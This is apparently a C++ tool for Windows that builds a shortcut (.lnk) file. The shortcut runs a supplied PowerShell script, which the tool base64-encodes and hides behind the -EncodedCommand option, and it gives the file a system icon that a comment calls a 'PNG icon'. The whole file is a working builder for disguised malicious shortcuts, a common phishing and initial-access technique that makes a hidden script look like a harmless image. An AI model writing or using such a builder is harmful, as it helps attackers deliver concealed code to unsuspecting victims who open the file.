#include <windows.h>
#include <wincrypt.h>
#include <shobjidl.h> 
#include <iostream>
#include <fstream>
#include <vector>

#pragma comment(lib, "Crypt32.lib")


// Function to read file and return base64 encoded string
std::wstring ReadAndEncodeFile(const std::wstring& filename) {
    std::ifstream file(filename, std::ios::binary);

    // Read the file into a string
    std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    // Convert the file content from ASCII to UTF-16LE (Little Endian)
    int wideSize = MultiByteToWideChar(CP_ACP, 0, fileContent.data(), fileContent.size(), NULL, 0);
    std::wstring utf16leContent(wideSize, 0);
    MultiByteToWideChar(CP_ACP, 0, fileContent.data(), fileContent.size(), &utf16leContent[0], wideSize);

    DWORD base64Length = 0;
    // Get the length of the base64 encoded string
    if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(utf16leContent.data()), wideSize * sizeof(wchar_t), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Length)) {
        std::cerr << "Failed to calculate buffer size for base64 encoding" << std::endl;
        return L"";
    }

    // Base64 encode the UTF-16LE string
    std::wstring base64Content(base64Length, 0);
    if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(utf16leContent.data()), wideSize * sizeof(wchar_t), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &base64Content[0], &base64Length)) {
        std::cerr << "Failed to base64 encode file content" << std::endl;
        return L"";
    }

    return base64Content;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 4) {
        std::wcerr << L"Usage: " << argv[0] << L" <PowerShell script path> <shortcut path> <icon offset>" << std::endl;
        return 1;
    }

    int icon_offset = _wtoi(argv[3]);
    CoInitialize(NULL);

    IShellLinkW* pShellLink = NULL;
    HRESULT hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLinkW, (void**)&pShellLink);

    if (SUCCEEDED(hres)) {
        IPersistFile* pPersistFile;
        hres = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);

        if (SUCCEEDED(hres)) {
            std::wstring psFilePath = argv[1]; // PowerShell script path from command line argument
            std::wstring encodedContent = ReadAndEncodeFile(psFilePath);

            std::wstring command = L"powershell.exe -EncodedCommand " + encodedContent;
            std::wcout << encodedContent;
            pShellLink->SetPath(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            pShellLink->SetArguments(command.c_str());
            pShellLink->SetIconLocation(L"C:\\Windows\\System32\\imageres.dll", icon_offset); // PNG icon

            // Save the link by calling IPersistFile::Save. 
            hres = pPersistFile->Save(argv[2], TRUE);  // Shortcut path from command line argument
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();

    return 0;
}
